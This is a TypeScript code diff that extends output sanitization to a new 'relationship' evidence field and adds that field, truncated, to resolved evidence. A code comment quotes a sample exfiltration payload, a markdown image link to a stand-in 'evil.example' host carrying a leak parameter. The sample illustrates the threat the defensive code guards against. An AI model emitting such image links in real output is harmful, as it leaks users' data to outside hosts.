@@ -223,14 +223,15 @@ function defangOutput(output: BriefOutput): BriefOutput {
       ...item,
       summary: defangText(item.summary),
       ...(item.when !== undefined ? { when: defangText(item.when) } : {}),
-      // `where`/`who` are code-copied but still untrusted source bytes — a channel
-       // renamed to `![](https://evil.example/?q=leak)` reaches this field verbatim —
-      // so they defang exactly like the quote does. Code-copied means unfabricated,
-      // not trusted (ADR-0004 §1).
+      // `where`/`who`/`relationship` are code-copied but still untrusted source bytes —
+      // a channel renamed to `![](https://evil.example/?q=leak)` reaches this field
+      // verbatim — so they defang exactly like the quote does. Code-copied means
+      // unfabricated, not trusted (ADR-0004 §1).
       evidence: item.evidence.map((e) => ({
         ...e,
         ...(e.where !== undefined ? { where: defangText(e.where) } : {}),
         ...(e.who !== undefined ? { who: e.who.map(defangText) } : {}),
+        ...(e.relationship !== undefined ? { relationship: defangText(e.relationship) } : {}),
         quote: defangText(e.quote),
       })),
     })),
@@ -297,6 +298,13 @@ function resolveEvidence(items: ExtractedItem[], rendered: RenderedBundle): Brie
             : {}),
           ...(attribution?.who !== undefined
             ? { who: attribution.who.slice(0, WHO_MAX).map((w) => w.slice(0, LABEL_MAX)) }
+            : {}),
+          // The item's own relationship, not the query's: it is what lets a consumer
+          // attribute a quote, since a DM's `where` and `who` read the same in both
+          // directions (#94). `extras.relationship` keeps its separate meaning — the
+          // query family that surfaced the item — and the two can differ on purpose.
+          ...(attribution?.relationship !== undefined
+            ? { relationship: attribution.relationship.slice(0, LABEL_MAX) }
             : {}),
           quote: e.quote,
         });
